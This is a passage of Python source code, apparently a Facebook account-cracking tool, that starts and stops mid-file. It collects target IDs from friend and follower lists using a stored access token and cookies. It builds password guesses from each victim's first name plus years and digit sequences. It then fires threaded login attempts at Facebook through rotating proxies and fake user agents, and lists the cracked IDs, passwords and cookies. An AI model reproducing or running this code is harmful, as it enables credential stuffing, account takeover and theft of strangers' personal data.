	table.add_row("04","𝑐𝑒𝑘 𝑟𝑒𝑠𝑢𝑙𝑡","ONLINE")
	table.add_row("05", "Tᴇʟᴇɢʀᴀᴍ ᴜᴇsᴀʀ","ONLINE")
	table.add_row("06","ᴄʜᴀɴɴᴇʟ ᴛᴇʟᴇɢʀᴀᴍ"," ", "ONLINE")
	table.add_row("00", "bo darawa", "ONLINE")
	Consol=Console()
	cetak(nel(table,width=90,title=f"[bold green]MENU",style="bold hot_pink2"))

	RAF_MKZ=wa.input(f"  [bold white] ╰─ [bold white]PILIH : [bold white]") 
	if RAF_MKZ in ['1','01']:
		raf_dump()
	elif RAF_MKZ in ['2','02']:
		dump_massal()
	elif RAF_MKZ in ['3','03']:
		File2()
	elif RAF_MKZ in ['4','04']:
		result()
	elif RAF_MKZ in ['5','05']:
		cetak(panel(f"to contect me in telegram ",width=90,title=f"[bold green]Link Donasi",padding=(0,8),style=f"bold white"))
		os.system("xdg-open https://t.me/nader20090")
	elif RAF_MKZ in ['6','06']:
		cetak(panel(f"joine my telegram chanell",width=90,title=f"[bold red]Link Grup Milw0rm • Code",padding=(0,8),style=f"bold white"))
		os.system("xdg-open https://t.me/nader20090")
	elif RAF_MKZ in ['0','00']:
		os.system('rm -rf .token.txt')
		os.system('rm -rf .cookie.txt')
		print(f'{m}Sukses Logout+Hapus Cookies{x}')
		exit()
	else:
		print(' ╰─  Pilih Yang Bener Asu ')
		back()
def error():
	print(f' ╰─  Maaf Fitur Ini Masih Di Perbaiki')
	time.sleep(4)
	back() 
#-----------------[ NADER ]-----------------#
def lainnya():
	tree = Tree(' ')
	tree.add(f'{h}1. {P}CRACK USERNAME')
	tree.add(f'{h}2. {P}CRACK FOLLOWERS')
	cetak(tree)
	RAF_MKZ=wa.input(f"  [bold grey] ╰─ PILIH : [bold red]") 
	if RAF_MKZ in ['1','01']:
		crack_nama()
	elif RAF_MKZ in ['2','02']:
		pengikut()
	else:
		print ('PILIH YANG BENAR BANG')
		time.sleep(5)
		back()
		
def pengikut():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	ses = requests.Session()
	cetak(panel(f"print 'Me' for dumbing your Total Followers",width=90,padding=(0,7),style=f"bold white"))
	akun = console.input(f' ╰─  print Id Target : ')
	try:
		koh2 = ses.get(f'https://graph.facebook.com/{akun}?fields=subscribers.limit(5000)&access_token={token}',cookies={'cookie': cok}).json()
		for pi in koh2['subscribers']['data']:
			try:
			    id.append(pi['id']+'|'+pi['name'])
			    sys.stdout.write(f"\r ╰─  totale {len(id)} Idz...");sys.stdout.flush()
			    time.sleep(0.0002)
			except:continue
		print("\r")
		cetak(panel(f"Berhasil Mengumpulkan {len(id)} Idz",width=90,padding=(0,22),style=f"bold white"))
		setting()
	except requests.exceptions.ConnectionError:
		print(f" ╰─  Koneksi Internet Anda Bermasalah")
		time.sleep(3);exit()
	except (KeyError,IOError):
		print(f" ╰─  Gagal Dump Id, Kemungkinan Akun Private")
		time.sleep(3);exit()

def crack_nama():
	nama = []
	custom = [" iqbal"," kami"," siska"," batam"," medan"," new"," old"," jian"," store"," tias"," rio"," lia"," farz"," marvel"," jakarta"," anisha"," juven"," der"," rika"," udin"," rayan"," tina"," hendrik"," fahmi"," baili"," rima"," gadis"," dimas"," abram"," ajis"," vicky"," charlie"," piko"," billa"]
	custom2 = ["galang ","gilang ","gita ","steven ","aulia ","tiyas ","albert ","naura ","naira ","mancung ","dewi ","josen ","johan ","slot ","sharil ","hendrik ","edo ","ridho ","anton ","reval ","abi ","yehezkiel ","hafiz ","daniel ","angun ","ayu","putri"]
	cetak(panel(f"    Crack Username Satu Nama Yang Ingin Di Crack Setara Dengan 5.000 Username",width=90,padding=(0,2),style=f"bold white"))
	nam = wa.input(f' ╰─  Masukan Nama : ').split(",")
	for ser in nam:		
		for belakang in custom:
			id = ser+belakang
			nama.append(id)
		for depan in custom2:
			id = depan+ser
			nama.append(id)
	with tred(max_workers=5) as thread:
		for id in nama:
			thread.submit(cari_nama,f"https://mbasic.facebook.com/public/{id}?/locale2=id_ID")
	setting()
def cari_nama(link):
	r = parser(ses.get(str(link)).text,'html.parser')
	for x in r.find_all('td'):
		data = re.findall('\<a\ href\=\"\/(.*?)\">\<div\ class\=\".*?\">\<div\ class\=\".*?\">(.*?)<\/div\>',str(x))
		for uid,nama in data:
			if 'profile.php?' in uid:
				uid = re.findall('id=(.*)',str(uid))[0]
			elif '<span' in nama:
				nama = re.findall('(.*?)\<',str(nama))[0]
			bo = uid+'|'+nama
			if bo in id:pass
			else:id.append(bo)
	link = r.find('a',string='Lihat Hasil Selanjutnya').get('href')
	if(link):
	  sys.stdout.write(f"\r ╰─  Mengumpulkan {len(id)} Idz ...");sys.stdout.flush()
	  time.sleep(0.0000007)
	  cari_nama(link)
	else:
	     print("\r")
	
def clon_email():
	rc = random.choice
	rr = random.randint
	bas = ['andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko']
	blk = ['99','official','gaming','utama','123','1234','12345','123456','cakep']
	global ok , cp
	print(f' [{hh}>{P}] Dump Dari Email, Max 1000 Id')
	nama = input(' target : ')
	if ',' in str(nama):
		exit(f' [{M}<{P}] Masukan 1 Nama Saja')
	doma = input(' domain : ')
	if '@' not in str(doma) or '.com' not in str(doma):
		exit(f' [{M}<{P}] Masukan Domain Yang Benar')
	jumlah = input(' total  : ')
	for xyz in range(int(jumlah)):
		A = nama
		B = [f'{str(rc(bas))}',f'{str(rr(0,31))}',f'{str(rc(blk))}'f'{str(rc(bas))}{str(rr(0,31))}',f'{xyz}',f'{str(rc(blk))}{str(rr(0,31))}',f'{str(rc(bas))}{str(rc(blk))}']
		C = doma
		D = f'{A}{str(rc(B))}{C}'
		if D in dump:pass
		else:dump.append(D+'|'+nama)
		if len(dump)==2000:atur_atur()
		print('\r Sedang Dump %s id'%(len(dump)),end='')
		sys.stdout.flush()
	setting()	
#-----------------[ NADER ]-----------------#
def result():
	cetak(panel(f'[bold white][[bold green]01[/][bold white]][/] [bold white]Hasil OK[/]\n[bold white][[bold green]02[/][bold white]][/] [bold white]Hasil CP[/]\n[bold white][[bold green]03[/][bold white]][/] [bold red]Kembali[/]',width=100,title=f"[bold white]• [/][bold green]List Menu Cek[/][bold white] •[/]",style=f"{domris}"))
	kz = input(f'\n {P}[{x}{H}?{x}{P}]{x} {P}select{x} : ')
	if kz in ['2','02']:
		try:vin = os.listdir('𝑪𝒑_SENA❌')
		except FileNotFoundError:
			print(' ╰─  File Tidak Di Temukan ')
			time.sleep(3)
			back()
		if len(vin)==0:
			print(' ╰─  Anda Tidak Memiliki Hasil CP ')
			time.sleep(4)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('CP/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<10:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input(f'\n{P}{x}{H} ╰─  {x}{P}{x} {P}Select{x} : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' ╰─  Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('CP/'+geh,'r').read().splitlines()
			except:
				print(' ╰─  File Tidak Di Temukan ')
				time.sleep(4)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="yellow"))
				nocp +=1
			input('[ Klik Enter ]')
			back()
	elif kz in ['1','01']:
		try:vin = os.listdir('𝒐𝒌_SENA✅')
		except FileNotFoundError:
			print(' ╰─  File Tidak Di Temukan ')
			time.sleep(4)
			back()
		if len(vin)==0:
			print(' ╰─  Anda Tidak Mempunyai File OK ')
			time.sleep(4)
			back()
		else:
			cih = 0
			lol = {}
			for isi in vin:
				try:hem = open('OK/'+isi,'r').readlines()
				except:continue
				cih+=1
				if cih<80:
					nom = '0'+str(cih)
					lol.update({str(cih):str(isi)})
					lol.update({nom:str(isi)})
					print('['+nom+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
				else:
					lol.update({str(cih):str(isi)})
					print('['+str(cih)+'] '+isi+' [ '+str(len(hem))+' Account ]'+x)
			geeh = input('\n ╰─  Pilih : ')
			try:geh = lol[geeh]
			except KeyError:
				print(' ╰─  Pilih Yang Bener Kontol ')
				exit()
			try:lin = open('OK/'+geh,'r').read().splitlines()
			except:
				print(' ╰─  File Tidak Di Temukan ')
				time.sleep(4)
				back()
			nocp=0
			for cpku in range(len(lin)):
				cpkuni=lin[nocp].split('|')
				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
				sol().print(mark(cpkuh,style="green"))
				print(f'{hh}COOKIE : {x}{cpkuni[2]}')
				nocp +=1
			input('[ Klik Enter ]')
			back()
	elif kz in ['3','03']:
		back()
	else:
		print(' ╰─  Pilih Yang Bener Kontol ')
		exit()
#-------------------[ NADER ]----------------#
def raf_dump():
	try:
		cok = open('.cok.txt','r').read()
		token = open('.token.txt','r').read()
	except IOError:
		exit()
	pil = input(f'{P} ╰─  {P} ID target input : \x1b[1;92m ')
	try:
		koH = requests.get('https://graph.facebook.com/v1.0/'+pil+'?fields=friends.limit(5000)&access_token='+tokenku[0],cookies={'cookie': cok}).json()
		for pi in koH['friends']['data']:
			try:id.append(pi['id']+'|'+pi['name'])
			except:continue
		print('')
		print(f'{M} ╰─  {P}Total ID yang dumbing : {h}'+str(len(id)))
		setting()
	except requests.exceptions.ConnectionError:
		print(' ╰─  Internet Lu Gak Ada Anjing')
		exit()
	except (KeyError,IOError):
		print(' ╰─  check your cookie and id why is not dumbing?')
		exit()
#-------------------[ NADER ]----------------#
def dump_massal():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:
		exit()
	try:
		jum = int(input(f'{m}╰─ {P}how many id woant to crack?  :  ')) 
	except ValueError:
		print(' ╰─  Wrong input ')
		exit()
	if jum<1 or jum>80:
		print(f' [{h}*{x}] Friendship Not Public  ')
		exit()
	ses=requests.Session()
	yz = 0
	for met in range(jum):
		yz+=1
		kl = input(f'{m}╰─ {P}print Idz Target to crack ' +str(yz)+ ' : ' )
		uid.append(kl)
	for userr in uid:
		try:
			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
			for mi in col['friends']['data']:
				try:
					iso = (mi['id']+'|'+mi['name'])
					if iso in id:pass
					else:id.append(iso)
				except:continue
		except (KeyError,IOError):
			pass
		except requests.exceptions.ConnectionError:
			print(' ╰─  Unstable Signal ')
			exit()
	try:
		cetak(nel(f'[bold white]Total Idz Target dumbing sucses{x} : {h}'+str(len(id)),width=79, title=f'[bold green]TOTAL ID', style='bold hot_pink2')) 
		setting()
	except requests.exceptions.ConnectionError:
		print(f'{x}')
		print(' ╰─  Unstable Signal ')
		back()
	except (KeyError,IOError):
		print(f' ╰─  {k} Friendship Not Public {x}')
		time.sleep(3)
		back()
#-------------[ NADER ]---------------#
def File2():
			print('')
			print('\x1b[1;92m             FILE CLONING')
			try:
				print('        - - - - - - - - - - - -')
				fileX = input (f' {P}[+] ENTER FILE PATH :\x1b[1;92m ') 
				for line in open(fileX, 'r').readlines():
					id.append(line.strip())
				print('')
				print('\x1b[1;92mTOTAL ID :\x1b[1;91m '+str(len(id)))
				setting()
			except IOError:
				exit("\x1b[1;91m[!] FILE  %s NOT FOUND"%(fileX))
def setting():
	table=Table()
	table.add_column("NO", justify="center", width=11, style="white") 
	table.add_column("MENU", justify="center", width=36, style="white") 
	table.add_column("STATUS", justify="center", width=20, style="green")
	table.add_row("01", "CRACK ID OLD", " RECOMENDED") 
	table.add_row("02","CRACK ID NEW","RECOMENDED")
	table.add_row("03","CRACK ID RANDOM","VERY RECOMENDED")
	cetak(nel(table, width=79, title=f"[bold green]URUTAN ID",style="bold hot_pink2"))
	hu = Console().input(f'[bold red] ╰─ [bold white]chose : ')
	if hu in ['1','01']:
		for tua in sorted(id):
			id2.append(tua)

	elif hu in ['2','02']:
		muda=[]
		for bacot in sorted(id):
			muda.append(bacot)
		bcm=len(muda)
		bcmi=(bcm-1)
		for xmud in range(bcm):
			id2.append(muda[bcmi])
			bcmi -=1
	elif hu in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	else:
		print(' ╰─  Choose the Right Opetion ')
		exit()
	table=Table()
	table.add_column("NO",justify="center",width=11,style="white")
	table.add_column("MENU CRACK ",justify="center",width=36,style="white")
	table.add_column("STATUS",justify="center",width=20,style="green")
	table.add_row("01","xot korak Assisi zan","VERY RECOMENDED")
	table.add_row("02","asycn mbasic","VERY RECOMENDED")
	table.add_row("03","reguler m.fb","Not Very")
	table.add_row("04","validate m.fb","Not Very")
	cetak(nel(table,width=79,title=f"[bold green]METODE LOGIN",style="bold hot_pink2"))
	hc = input(f'{M} ╰─  {P}Pilih metode : ')
	if hc in ['1','01']:
		method.append('mobile')
	elif hc in ['2','02']:
		method.append('mbasic')
	elif hc in ['3','03']:
		method.append('free')
	elif hc in ['4','04']:
		method.append('mobilev2')
	elif hc in ['5','05']:
		method.append('lawakv1')
	elif hc in ['6','06']:
	    method.append('lawakv2')
	else:
		method.append('mobile')
#	print('')
#	_jembot_ = input('\r╰─  Tampilkan Aplikasi y/t : \x1b[1;93m ')
#	if _jembot_ in ['']:
#		print('{M} ╰─  Pilih Yang Bener ')
#		back()
#	elif _jembot_ in ['y','Y']:
#		taplikasi.append('ya')
#	else:
#		taplikasi.append('no')
#	pwplus=input(f'\r╰─  {P}TAMBAHKAN SANDI MANUAL? Y/T : \x1b[1;93m ')
#	if pwplus in ['y','Y']:
#		pwpluss.append('ya')
#		pwku=input(f'\r╰─  {P}Masukkan Sandi : ')
#		pwkuh=pwku.split(',')
#		for xpw in pwkuh:
#			pwnya.append(xpw)
#	else:
#		pwpluss.append('no')
		
	cetak(panel(f'[bold white]Do you want to use a manual user-agent to crack an account ? Y/T',width=79,title=f"[bold green]Setting User-Agent",style="bold hot_pink2")) 
	uatambah = input(f'\r╰─  {P}ADD USER AGENT(UA) Y/N : \x1b[1;93m ')
	if uatambah in ['y','Ya','ya','Y']:
		uman.append('y')
		bzer = input(f' ╰─  User-Agent input : \x1b[1;93m ')
		usman1.append(bzer)
	else:
		uman.append('tidak')
	passwrd()
	
	
from datetime import datetime    	
#-------------------[ NADER ]------------#
def passwrd():
	global prog,des
	#print(f'{asu} FILE RESULT TERSIMPAN DI ↓')
	sayang=[]
	sayang.append(panel(f'[bold green]%s [bold white]'%(okc), width=39, title=f"[bold green]OK SAVE IN", style="bold hot_pink2")) 
	sayang.append(panel(f'[bold yellow]%s [bold white]'%(cpc),width=39,title=f"[bold yellow]CP SAVE IN",style="bold hot_pink2"))
	wa.print(Columns(sayang))
	print(f'\n\t\t\t{P}ON/OF MODE MODE AIRPLAN {M}200 {P}IDZ')
	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with tred(max_workers=30) as pool:
			for yuzong in id2:
				idf,nmf = yuzong.split('|')[0],yuzong.split('|')[1].lower()
				frs = nmf.split(' ')[0]
				pwv = []
				if len(nmf)<6:
					if len(frs)<3:
						pass
					else:

						pwv.append(frs+'123')

						pwv.append(frs+'1234')

						pwv.append(frs+'12345')

						pwv.append(frs+'54321')

						pwv.append(frs+'123456789')

						pwv.append(frs+'2003')

						pwv.append(frs+'2000')

						pwv.append('12345'+frs)

						pwv.append('123'+frs)

						pwv.append('123'+'123'+frs)

						pwv.append(frs+'2002')

						pwv.append(frs+frs+'123')
						
						pwv.append(frs+'112233')
						
						pwv.append(frs+'2004')
						pwv.append(frs+'1999')
						pwv.append(frs+'1998')
						pwv.append(frs+'1997')
					pwv.append(frs+'123')
					
					pwv.append(frs+'1234')
					
					pwv.append(frs+'12345')
					
					pwv.append(frs+'123456')
					
					pwv.append(frs+'1234567')
					
					pwv.append(frs+'12345678')
					
					pwv.append(frs+'123456789')
					
					pwv.append(frs+'1234567890')
					
					pwv.append(frs+'0099')
					
					pwv.append(frs+'009988')
					
					pwv.append(frs+'00998877')
					
					pwv.append(frs+'0099887766')
					
					pwv.append(frs+'009988778855')
					pwv.append(frs+'0099887744')
					
					pwv.append(frs+'009988774433')
					
					pwv.append(frs+'0099887744')
					
					pwv.append(frs+'0099887744332211')
					
					pwv.append(frs+'121')
					
					pwv.append(frs+'121121')
					
					pwv.append(frs+'11')
					
					pwv.append(frs+'1122')
					
					pwv.append(frs+'112233')
					
					pwv.append(frs+'11223344')
					
					pwv.append(frs+'1122334455')
					
					pwv.append(frs+'112233445566')
					
					pwv.append(frs+'11223344556677')
					
					pwv.append(frs+'1122334455667788')
					
					pwv.append(frs+'112233445566778899')
					
					pwv.append(frs+'11223344556677889900')
					pwv.append(frs+'0987')
					
					pwv.append(frs+'09876')
					
					pwv.append(frs+'098765')
					
					pwv.append(frs+'0987654')
					
					pwv.append(frs+'09876543')
					
					
					pwv.append(frs+'098765432')
					
					pwv.append(frs+'0987654321')
					
					pwv.append(frs+'123123')
					
					pwv.append(frs+'123123')
					
					pwv.append(frs+'1980')
					
					pwv.append(frs+'1981')
					
					pwv.append(frs+'1982')
					
					pwv.append(frs+'1983')
					
					pwv.append(frs+'1984')
					
					pwv.append(frs+'1985')
					
					pwv.append(frs+'1986')
					
					pwv.append(frs+'1987')
					
					pwv.append(frs+'1988')
					
					pwv.append(frs+'1989')
					
					pwv.append(frs+'1990')
					
					pwv.append(frs+'1991')
					
					pwv.append(frs+'1992')
					
					pwv.append(frs+'1993')
					
					pwv.append(frs+'1994')
					
					pwv.append(frs+'1995')
					
					pwv.append(frs+'1996')
					
					pwv.append(frs+'1997')
					
					pwv.append(frs+'1998')
					
					pwv.append(frs+'1999')
					
					pwv.append(frs+'2000')
					
					pwv.append(frs+'2001')
					
					pwv.append(frs+'2002')
					
					pwv.append(frs+'2003')
					
					pwv.append(frs+'2004')
					
					pwv.append(frs+'2005')
					
					pwv.append(frs+'2006')
					
					pwv.append(frs+'2007')
					
					pwv.append(frs+'2008')
					
					pwv.append(frs+'2009')
					
					pwv.append(frs+'2010')
					
					pwv.append(frs+'2011')
					
					pwv.append(frs+'2012')
					
					pwv.append(frs+'2013')
					
					pwv.append(frs+'2014')
					
					pwv.append(frs+'2015')
					
					pwv.append(frs+'2016')
					
					pwv.append(frs+'2017')
					
					pwv.append(frs+'2018')
					
					pwv.append(frs+'2019')
					
					pwv.append(frs+'2020')
					
					pwv.append(frs+'2021')
					
					pwv.append(frs+'2022')
					
					pwv.append(frs+'2023')
					
					pwv.append(frs+'2024')
					
					pwv.append(frs+'@')
					
					pwv.append(nmf)
					
					pwv.append(frs+'123')
					
					pwv.append(frs+'0009684363')
					
					pwv.append(frs+'888898536')
					
					pwv.append(frs+'00594663')
					
					pwv.append(frs+'0007582324')
					
					pwv.append(frs+'99867406363')
					
					
					pwv.append(frs+'9975474')
					
					pwv.append(frs+'97875757')
					
					pwv.append(frs+'888868685')
					
					pwv.append(frs+'0876447564')
					
					pwv.append(frs+'9986004753')
					
					pwv.append(frs+'0008684764')
					
					pwv.append(frs+'0009787543')
					
					
					pwv.append(frs+'0095426466')
					
					pwv.append(frs+'9973656532')
				else:

					if len(frs)<3:

						pwv.append(nmf)

						pwv.append(frs+frs)

					else:

						pwv.append(nmf)

						pwv.append(frs+frs)

						pwv.append(frs+'123')

						pwv.append(frs+'1234')

						pwv.append(frs+'12345')

						pwv.append(frs+'54321')

						pwv.append(frs+'123456789')

						pwv.append(frs+'2003')

						pwv.append(frs+'2000')

						pwv.append('12345'+frs)

						pwv.append('123'+frs)

						pwv.append('123'+'123'+frs)

						pwv.append(frs+'2002')

						pwv.append(frs+frs+'123')
						
						pwv.append(frs+'112233')
						
						pwv.append(frs+'2004')
						pwv.append(frs+'1999')
						pwv.append(frs+'1998')
						pwv.append(frs+'1997')
						
						pwv.append('1234'+frs)
				if 'ya' in pwpluss: 
					for xpwd in pwnya:
						pwv.append(xpwd)
				else:pass
				if 'mobile' in method:
					pool.submit(crack,idf,pwv)
				elif 'free' in method:
					pool.submit(crackfree,idf,pwv)
				elif 'mobilev2' in method:
					pool.submit(crackmobilev2,idf,pwv)
				elif 'lawakv1' in method:
					pool.submit(cracklawakv1,idf,pwv)
				elif 'mbasic' in method:
					pool.submit(crackmbasic,idf,pwv)
				elif 'lawakv2' in method:
					pool.submit(cracklawakv2,idf,pwv)
				else:
					pool.submit(crackmbasic,idf,pwv)
		print('')
	print(f'  crack done type [y] for crack again')
	print(f'  [{h}•{x}]{h} Oᴋ_Sena✅ : {h}%s '%(ok))
	print(f'{x}  [{h}•{x}]{k} Cᴘ_Sena❌ : {k}%s{x} '%(cp))
	
def useragent():
	sambro = str(random.randint(1,100))+'.'+str(random.randint(0,10))
	android_version = str(random.randint(1,24))
	device_model = random.choice(['RMO-NX1','SHARK PAR-H0','SAMSUNG SM-G736U1','SAMSUNG SM-G736U1','Infinix X655F','Nokia 8 V 5G UW','T790Y','T810S','RMX2202','CPH1983','SAMSUNG SM-G935L Build/NRD90M','SAMSUNG SM-E5260','SAMSUNG SM-A826S','Lenovo L19041','CPH2401','SAMSUNG SM-M336K/KSU3AVI3','BV8800','SAMSUNG SM-M017F','Z6252CA','SC-51B','V2044','SAMSUNG SM-J700P','KAZ-N20','BV9800','BV6600E'])
	chrome_version = str(random.randint(76,110))+'.0.'+str(random.randint(2000,6000))+'.'+str(random.randint(0,223))
	ua = f'Mozilla/5.0 (Linux; Android {android_version}; {device_model}) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/{sambro} Chrome/{chrome_version} Mobile Safari/537.36'
	return ua
#--------------------[ NADER ]-----------------#
def crack(idf,pwv):
	global loop,ok,cp
	bo = random.choice([m,k,h,b,u,x])
	ua = random.choice(ugen)
	#ua2 = random.choice(ugen2)
	ses = requests.Session()
	prog.update(des,description=f"{k}SENA{x} {loop}/{len(id)} OK-:[bold green]{ok}[/] CP-:[bold yellow]{cp}[/]")
	prog.advance(des) 
	for pw in pwv:
		try:
			if 'ya' in uman: ua = usman1[0]
			nip=random.choice(prox)
			proxs= {'http': 'socks4://'+nip}
			link = ses.get('https://d.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr')
			data = {
'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),
'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),
'm_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),
'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),
'try_number': 0,
'unrecognized_tries': 0,
'email':idf,
'pass':pw,
'login':'Masuk',
'prefill_contact_point': '',
'prefill_source': '',
'prefill_type': '',
'first_prefill_source': '',
'first_prefill_type': '',
'had_cp_prefilled': False,
'had_password_prefilled': False,
'is_smart_lock': False,
'bi_xrwh': 0
}
			headers = {'Host': 'd.facebook.com','x-fb-rlafr': '0','access-control-allow-origin': '*','facebook-api-version': 'v12.0','strict-transport-security': 'max-age=15552000; preload','pragma': 'no-cache','cache-control': 'private, no-cache, no-store, must-revalidate','x-fb-request-id': 'A3PUDZnzy2xgkMAkH9bcVof','x-fb-trace-id': 'Cx4jrkJJire','x-fb-rev': '1007127514','x-fb-debug': 'AXRLN2ab6tbNBxFWS6kiERe8mEyeHkpYgc1xM77joSCak8hY1B2+tWfeptUXVmRpMqno2j95r13+cw0bLoOi4A==','content-length': '2141','cache-control': 'max-age=0','sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','save-data': 'on','upgrade-insecure-requests': '1','origin': 'https://d.facebook.com','content-type': 'application/x-www-form-urlencoded','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://d.facebook.com/login.php?skip_api_login=1&api_key=345000986033587&kid_directed_site=0&app_id=345000986033587&signed_next=1&next=https%3A%2F%2Fd.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&cancel_url=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6'}
			po = ses.post('https://d.facebook.com/login/device-based/login/async/?api_key=345000986033587&auth_token=fc3a739419a39bebc2d6667c045da0cd&skip_api_login=1&signed_next=1&next=https%3A%2F%2Fm.facebook.com%2Fv12.0%2Fdialog%2Foauth%3Fcct_prefetching%3D0%26client_id%3D345000986033587%26cbt%3D1679190355185%26e2e%3D%257B%2522init%2522%253A1679190355186%257D%26ies%3D0%26sdk%3Dandroid-12.2.0%26sso%3Dchrome_custom_tab%26nonce%3D36eab410-3bf2-4a18-92b6-8899482bce03%26scope%3Dopenid%252Cpublic_profile%252Cuser_gender%252Cuser_friends%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%26default_audience%3Dfriends%26login_behavior%3DNATIVE_WITH_FALLBACK%26redirect_uri%3Dfb345000986033587%253A%252F%252Fauthorize%252F%26auth_type%3Drerequest%26response_type%3Did_token%252Ctoken%252Csigned_request%252Cgraph_domain%26return_scopes%3Dtrue%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D8fabc5ff-90e2-4258-a451-a1f4a796c348%26tp%3Dunspecified&refsrc=deprecated&app_id=345000986033587&cancel=fb345000986033587%3A%2F%2Fauthorize%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%25220_auth_logger_id%2522%253A%25228fabc5ff-90e2-4258-a451-a1f4a796c348%2522%252C%25223_method%2522%253A%2522custom_tab%2522%252C%25227_challenge%2522%253A%25229v54bbhoj58tns0r4tjn%2522%257D%23_%3D_&lwv=100',data=